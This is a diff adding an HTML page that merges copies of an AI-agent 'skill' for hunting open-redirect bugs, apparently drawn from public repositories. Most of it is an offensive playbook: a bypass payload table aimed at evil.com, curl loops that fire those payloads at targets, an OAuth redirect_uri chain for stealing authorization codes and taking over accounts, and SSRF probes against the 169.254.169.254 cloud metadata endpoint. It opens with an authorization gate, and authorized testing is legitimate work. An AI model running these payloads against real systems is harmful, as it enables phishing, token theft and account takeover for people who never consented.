@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>hunt-open-redirect</title>
+<style>
+body { font: 14px/1.45 ui-monospace, monospace; margin: 1.5rem; }
+a { color: #0645ad; }
+table { border-collapse: collapse; width: 100%; }
+th, td { text-align: left; padding: 0.2rem 0.7rem 0.2rem 0; vertical-align: top; }
+th { border-bottom: 1px solid #ccc; }
+.crumbs { margin-bottom: 1rem; }
+.meta { color: #444; }
+pre { white-space: pre-wrap; background: #f6f6f6; padding: 0.8rem; }
+</style>
+</head>
+<body>
+<p class="crumbs"><a href="../../index.html">domains</a> / <a href="../index.html">security</a> / <a href="index.html">open-redirect-hunt</a> / hunt-open-redirect</p><h1>hunt-open-redirect</h1><p class="meta">combined</p><p>The two copies share the same core procedure (discover redirect parameters, basic curl test, bypass payloads, OAuth chain test) and the same bypass table. However, the uphiago copy adds a &#x27;When to Use&#x27; section, a &#x27;Common Root Causes&#x27; list, and &#x27;Real Examples&#x27; that the sickn33 copy lacks. Conversely, the sickn33 copy adds a mandatory authorization confirmation gate, a &#x27;Phase 3b&#x27; for DOM-based open redirects, a &#x27;Phase 5&#x27; for SSRF escalation, and an &#x27;Automation&#x27; section with specific tools (openredirex, nuclei) that the uphiago copy lacks. Crowning one would hide these distinct procedural steps and constraints.</p><h2>Repositories</h2><table><thead><tr><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-open-redirect/SKILL.md</code></td></tr><tr><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-open-redirect/SKILL.md</code></td></tr></tbody></table><h2>Other copies</h2><table><thead><tr><th>Role</th><th>Repository</th><th>Path</th></tr></thead><tbody><tr><td>peer</td><td><a href="https://github.com/uphiago/recon-skills">uphiago/recon-skills</a></td><td><code>redteam/hunt-open-redirect/SKILL.md</code></td></tr><tr><td>peer</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills-claude/skills/hunt-open-redirect/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>plugins/agentic-awesome-skills/skills/hunt-open-redirect/SKILL.md</code></td></tr><tr><td>adapter</td><td><a href="https://github.com/sickn33/agentic-awesome-skills">sickn33/agentic-awesome-skills</a></td><td><code>skills/hunt-open-redirect/SKILL.md</code></td></tr></tbody></table><h2>Combined skill</h2><pre>---
+name: hunt-open-redirect
+description: Hunt Open Redirect — all types including low-impact, chained to OAuth token theft → ATO, phishing chains. URL parameter manipulation, JavaScript redirect, meta refresh, header injection. Use when hunting redirect bugs or building ATO chains.
+version: 1.1.0
+license: MIT
+category: security
+risk: offensive
+---
+
+# HUNT-OPEN-REDIRECT — Open Redirect
+
+## Authorization Gate
+&gt; **⚠️ AUTHORIZED USE ONLY**
+&gt; This skill is for educational purposes or authorized security assessments only.
+&gt; You must have explicit, written permission from the system owner before using this tool.
+
+**Mandatory confirmation gate:**
+Before running any command that probes, exploits, or extracts data from a target:
+1. Ask the user to state the exact target URL, IP, account, or resource.
+2. Ask the user to confirm written authorization and the permitted scope.
+3. Show the exact command(s) and explain their expected effect.
+4. Wait for explicit confirmation in the current conversation.
+
+Without that confirmation, remain read-only and provide defensive guidance only.
+
+## When to Use
+Use when the target has any redirect parameter — `?url=`, `?next=`, `?redirect=`, `?return=`, `?redirect_uri=`, or similar — on login/logout flows, OAuth authorization endpoints, language switchers, payment redirects, or any parameter that controls where the user is sent after an action. Open redirect alone is Low on most programs, but becomes Critical when chained to OAuth token theft (redirect_uri bypass) or SSRF escalation. Every OAuth authorization endpoint with a configurable `redirect_uri` is the highest-value target.
+
+## Crown Jewel Targets
+Open redirect alone is Low. Chained to OAuth = Critical (ATO).
+
+**Highest-value chains:**
+- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
+- **Open redirect → phishing** — users trust the URL because it starts with target.com
+- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
+- **Open redirect → session fixation** — force user to login endpoint with pre-set session
+
+## Attack Surface Signals
+```
+?redirect=
+?next=
+?url=
+?return=
+?returnTo=
+?continue=
+?dest=
+?destination=
+?go=
+?forward=
+?location=
+?target=
+?redir=
+?redirect_uri=
+?callback=
+?checkout_url=
+?success_url=
+?cancel_url=
+/logout?returnTo=
+/login?next=
+/sso?callback=
+```
+
+## Bypass Table
+| Technique | Payload |
+|-----------|---------|
+| Basic | `https://evil.com` |
+| Protocol relative | `//evil.com` |
+| Backslash bypass | `/\\evil.com` |
+| At-sign confusion | `https://target.com@evil.com` |
+| Double slash | `//evil.com/%2F..` |
+| URL encoding | `%2Fevil.com` |
+| Null byte | `evil.com%00target.com` |
+| Whitespace | `evil.com%09` or `%20` |
+| JavaScript URI | `javascript:window.location=&#x27;https://evil.com&#x27;` |
+| Data URI | `data:text/html,&lt;script&gt;window.location=&#x27;https://evil.com&#x27;&lt;/script&gt;` |
+| Subdomain | `https://target.com.evil.com` |
+| Fragment | `https://evil.com#.target.com` |
+
+## Common Root Causes
+1. **Parameter whitelist without validation** — Developers maintain a list of redirect parameters but only validate that the parameter *exists*, not its value.
+2. **User-friendly redirect features** — Post-login redirect, logout redirect, and language-switching features all need to redirect to user-controlled destinations.
+3. **Third-party OAuth/SAML libraries** — Many auth libraries allow configuring `redirect_uri` validation loosely (prefix match, suffix match, wildcard) that match attacker-controlled subdomains.
+4. **SSO implementation shortcuts** — Developers configure `redirect_uri` to accept the current request Host header, enabling Host-header-based open redirects.
+5. **Assume-JSON-bodies-are-safe** — POST-based redirect parameters in API requests frequently skip validation that GET-based redirects enforce.
+6. **Fragment and linefeed handling** — URL parsers disagree on what constitutes the end of a URL; newlines and carriage returns can break out of URL validation.
+
+## Real Examples
+**Scenario A — OAuth redirect_uri Wildcard → 1-Click ATO**
+A ride-sharing platform&#x27;s OAuth implementation accepted `redirect_uri` values matching `*.uberinternal.com`. An attacker found a dangling subdomain at `support.uberinternal.com` that could be claimed. By crafting an authorize URL with `redirect_uri=https://support.uberinternal.com/oauth-callback`, an attacker could intercept the auth code of any user who clicked the link, exchange it for an access token, and achieve full account takeover. Impact: Critical — complete user account takeover via a single crafted link.
+
+**Scenario B — Logout Redirect in Password Reset Email → Session Hijack**
+A major e-commerce platform&#x27;s password reset email contained a logout link with a `redirect_to` parameter. The `redirect_to` parameter accepted any URL, including `https://evil.com`. An attacker who could intercept the reset email could modify the redirect target. After the victim reset their password, they were redirected to the attacker&#x27;s site with the new session cookie still valid for cross-origin exfiltration. Impact: session hijack post-password-reset.
+
+## Step-by-Step Hunting Methodology
+
+### Phase 1 — Discover Redirect Parameters
+```bash
+# Extract all redirect candidates from crawl
+cat recon/$TARGET/urls.txt | gf redirect &gt; recon/$TARGET/redirect-candidates.txt
+wc -l recon/$TARGET/redirect-candidates.txt
+
+# Less common param names
+grep -E &quot;(\?|&amp;)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)&quot; \
+  recon/$TARGET/urls.txt &gt;&gt; recon/$TARGET/redirect-candidates.txt
+```
+
+### Phase 2 — Basic Test
+```bash
+COLLAB=&quot;https://evil.com&quot;
+cat recon/$TARGET/redirect-candidates.txt | qsreplace &quot;$COLLAB&quot; | while read url; do
+  LOC=$(curl --max-time 30 --connect-timeout 10 -s -I --max-redirs 0 &quot;$url&quot; | grep -i &quot;^location:&quot;)
+  STATUS=$(curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w &quot;%{http_code}&quot; --max-redirs 0 &quot;$url&quot;)
+  [ -n &quot;$LOC&quot; ] &amp;&amp; echo &quot;$STATUS | $LOC | $url&quot;
+done
+```
+
+### Phase 3 — Bypass Techniques
+```bash
+BASE_URL=&quot;https://$TARGET/redirect?url=&quot;
+PAYLOADS=(
+  &quot;https://evil.com&quot;
+  &quot;//evil.com&quot;
+  &quot;/\\evil.com&quot;
+  &quot;https://$TARGET@evil.com&quot;
+  &quot;https://evil.com%23.$TARGET&quot;
+  &quot;https://evil.com%09&quot;
+)
+for P in &quot;${PAYLOADS[@]}&quot;; do
+  LOC=$(curl --max-time 30 --connect-timeout 10 -s -I --max-redirs 0 &quot;${BASE_URL}${P}&quot; | grep -i &quot;^location:&quot;)
+  echo &quot;$P → $LOC&quot;
+done
+```
+
+### Phase 3b — DOM-based open redirect (client-side sink)
+Server-side `Location:` grepping misses redirects that happen purely in JS. Source (`location.hash`/`location.search`/`document.referrer`) assigned to a navigation sink.
+```bash
+grep -rEn &quot;location *=|location\.(href|assign|replace)\(|window\.open\(&quot; recon/$TARGET/ --include=&quot;*.js&quot; \
+  | grep -iE &quot;location\.(hash|search)|URLSearchParams|getParameter|referrer&quot;
+# Confirm in a browser (curl can&#x27;t): open  https://$TARGET/page#https://evil.com  (or ?url=...)
+# Common shape:  var u=new URLSearchParams(location.search).get(&#x27;url&#x27;); location=u;
+```
+
+### Phase 4 — OAuth Chain Test
+```bash
+# If target has OAuth, check if redirect_uri accepts open redirect
+grep -i &quot;oauth\|authorize\|redirect_uri&quot; recon/$TARGET/urls.txt | head -20
+
+# Construct OAuth URL with open redirect as redirect_uri
+# Normal: redirect_uri=https://target.com/callback
+# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
+OAUTH_URL=&quot;https://$TARGET/oauth/authorize&quot;
+curl -sv &quot;$OAUTH_URL?response_type=code&amp;client_id=CLIENT_ID&amp;redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com&quot; 2&gt;&amp;1 | grep -i &quot;location:&quot;
+```
+
+### Phase 5 — Server-Side Redirect (SSRF escalation)
+```bash
+# If the app fetches the redirect target server-side (302 fetch follow)
+curl -s &quot;https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/&quot;
+
+# Or: if app makes HTTP request to the redirect destination
+curl -s &quot;https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/&quot; \
+  -H &quot;Cookie: $SESSION&quot;
+```
+
+## Automation
+```bash
+# openredirex
+pip3 install openredirex
+openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com
+
+# nuclei
+nuclei -u https://$TARGET -t redirect/ -severity medium,high
+
+# gf + qsreplace
+cat recon/$TARGET/urls.txt | gf redirect | qsreplace &quot;https://evil.com&quot; | \
+  xargs -I{} curl -s -o /dev/null -w &quot;%{http_code} %{redirect_url}\n&quot; --max-redirs 0 {}
+```</pre>
+</body>
+</html>
